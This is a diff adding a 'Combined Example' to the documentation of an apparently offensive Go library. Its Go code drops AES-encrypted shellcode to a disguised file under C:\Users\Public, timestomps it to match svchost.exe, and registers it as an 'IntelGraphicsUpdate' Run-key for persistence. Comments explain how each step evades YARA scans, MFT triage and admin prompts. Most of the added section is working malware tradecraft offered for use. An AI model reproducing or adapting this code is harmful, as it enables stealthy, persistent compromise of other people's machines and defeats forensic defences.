@@ -63,6 +63,64 @@ m.Install()
 
 ---
 
+## Combined Example
+
+Install a registry Run-key that launches a dropper, then timestomp the
+dropper so it matches surrounding system files — harder to spot via
+`dir /tq` or MFT triage.
+
+```go
+package main
+
+import (
+    "os"
+    "time"
+
+    "github.com/oioio-space/maldev/cleanup/timestomp"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/persistence/registry"
+)
+
+func main() {
+    // 1. Encrypt payload with AES-GCM (key derived at build time).
+    key, _ := crypto.NewAESKey()
+    payload := []byte{ /* raw shellcode bytes */ }
+    blob, _ := crypto.EncryptAESGCM(key, payload)
+
+    // 2. Drop to disk in a location every process writes to.
+    droppers := `C:\Users\Public\Intel\update-cache.bin`
+    _ = os.MkdirAll(`C:\Users\Public\Intel`, 0o755)
+    _ = os.WriteFile(droppers, blob, 0o644)
+
+    // 3. Timestomp to match a trusted neighbour (svchost.exe here).
+    si, _ := os.Stat(`C:\Windows\System32\svchost.exe`)
+    t := si.ModTime()
+    _ = timestomp.SetFull(droppers, t, t, t)
+
+    // 4. Register boot persistence via HKCU\...\Run — no admin needed,
+    //    no SCM noise, survives user logon.
+    _ = registry.RunKey(
+        registry.HiveCurrentUser,
+        registry.KeyRun,
+        "IntelGraphicsUpdate",
+        droppers, // launcher reads the blob, decrypts, self-injects
+    ).Install()
+
+    // Decryption side (at execution time) — same key, reverse:
+    //   blob, _ := os.ReadFile(droppers)
+    //   sc, _  := crypto.DecryptAESGCM(key, blob)
+    //   then feed sc to inject.* of your choice.
+    _ = time.Now
+}
+```
+
+Layered benefit: the on-disk artifact is encrypted (defeats YARA file
+scans), its timestamps match a known-good binary (defeats MFT triage),
+and the reg value points at a low-privilege user hive (no admin prompt,
+no SCM).
+
+---
+
 ## API Reference
 
 See [persistence.md](../../persistence.md#persistenceregistry----registry-runrunonce-keys)
